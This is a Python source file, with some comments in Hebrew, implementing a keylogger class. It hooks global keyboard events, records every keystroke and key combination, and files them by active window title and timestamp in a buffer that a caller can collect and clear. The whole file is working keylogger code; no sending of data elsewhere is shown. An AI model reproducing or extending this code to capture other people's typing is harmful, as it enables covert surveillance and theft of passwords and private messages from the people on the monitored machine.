import keyboard
from  datetime import datetime
import pygetwindow as pw

class KeyloggerService:

    """
    This class receives all user keystrokes with data on the keystrokes.
    The data is the click time and the window in which it was pressed
    """

    # Initializing the class with a data field, and starting listening
    def __init__(self):
        self.__data = {}
        self.start()

    # מחזירה את הנתונים משדה __data ומאפסת את שדה זה
    @property
    def data(self) -> dict:
        temp_data = self.__data
        self.__data = {}
        return temp_data

    def start(self) -> None:
        keyboard.on_release(self.handle_input)

    @staticmethod
    def get_keyword(key: keyboard.KeyboardEvent) -> str: #קבלת המקש שלחץ עליו

        exchange_name = ["space","backspace"] #מקשים שצריך לשמור בפני עצמם

        if len(key.name) > 1:

            if key.name in exchange_name:
                return "~" + key.name + "~" #הוספת תו מיוחד למקשים מיוחדים בפני עצמם

            pressed_key_str = [value.name for k,value in keyboard._pressed_events.items()] #קבלת כל המקשים שנלחצו בו זמנית
            key_name = "".join(pressed_key_str) #חיבור לרץ אחד ארוך
            key_name += key.name
            key_name = "~" + key_name + "~" # הוספת תו מיוחד
            return key_name

        else:   #אם לחץ על מקש רגיל
            return key.name

    @staticmethod
    def get_time(key: keyboard.KeyboardEvent) ->str:
        key_time = key.time
        key_time = datetime.fromtimestamp(key_time).strftime('%Y-%m-%d %H:%M')
        return key_time

    @staticmethod
    def get_active_window() ->str:
        active_window =  pw.getActiveWindowTitle()
        return active_window if active_window else "unknown window"

    def handle_input(self,key) ->None:
        #מקבל את שם החלון שהוא הקליד בו
        active_window = self.get_active_window()
        if active_window not in self.__data:
            self.__data[active_window] = {}

        #מקבל את הזמן שהוא הקליד בו
        current_time = self.get_time(key)
        if current_time not in self.__data[active_window]:
            self.__data[active_window][current_time] = ''

        #מקבל את המקש שהוא לחץ עליו
        key_name = self.get_keyword(key)
        self.__data[active_window][current_time] += key_name





